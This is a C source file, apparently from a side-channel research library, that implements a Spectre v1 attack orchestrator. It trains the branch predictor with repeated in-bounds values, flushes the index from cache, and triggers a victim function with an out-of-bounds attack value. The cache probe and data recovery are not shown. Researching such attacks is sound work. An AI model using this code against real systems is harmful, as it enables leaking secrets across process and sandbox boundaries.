/**
 * @file spectre.c
 * @brief Implementation of Spectre attack orchestrators.
 */

#include <axium/sidechannel/cache.h>
#include <axium/sidechannel/cpu.h>
#include <axium/sidechannel/spectre.h>

void __attribute__((hot, flatten))
spectre_v1(const spectre_config_t *__restrict config,
           victim_trigger_t trigger_fn, void *trigger_ctx) {
  if (__builtin_expect(!config || !trigger_fn, 0))
    return;

  if (__builtin_expect(config->variant > SPECTRE_V1_2_READ, 0))
    return;

  void *const idx_addr = config->v1.index_addr;
  spec_setup_t setup_fn = config->v1.setup_fn;
  const size_t idx_size = config->v1.index_size;
  const size_t train_val = config->v1.training_val;
  const size_t attack_val = config->v1.attack_val;
  const uint32_t ratio = config->ratio;
  const uint32_t trials = config->trials;
  const uint32_t sync_delay = config->sync_delay;
  const uint32_t post_delay = config->post_delay;

  for (uint32_t t = 0; t < trials; t++) {
    for (int i = (int)ratio; i >= 0; i--) {
      const size_t x = (i == 0) ? attack_val : train_val;

      /* 1. Set the value using either callback or direct write */
      if (setup_fn) {
        setup_fn(x, trigger_ctx);
      } else if (idx_addr) {
        /* clang-format off */
        switch (idx_size) {
        case 1: *(volatile uint8_t *)idx_addr = (uint8_t)x; break;
        case 2: *(volatile uint16_t *)idx_addr = (uint16_t)x; break;
        case 4: *(volatile uint32_t *)idx_addr = (uint32_t)x; break;
        case 8: *(volatile uint64_t *)idx_addr = (uint64_t)x; break;
        default: __builtin_unreachable();
        }
        /* clang-format on */
      }
      mfence();

      /* 2. Flush index (if address provided) to stall resolution */
      if (idx_addr) {
        clflush(idx_addr);
        cpuid();
      }

      if (sync_delay > 0)
        delay_cycles(sync_delay);

      /* 3. Trigger victim */
      trigger_fn(trigger_ctx);

      if (post_delay > 0)
        delay_cycles(post_delay);
    }
  }
}
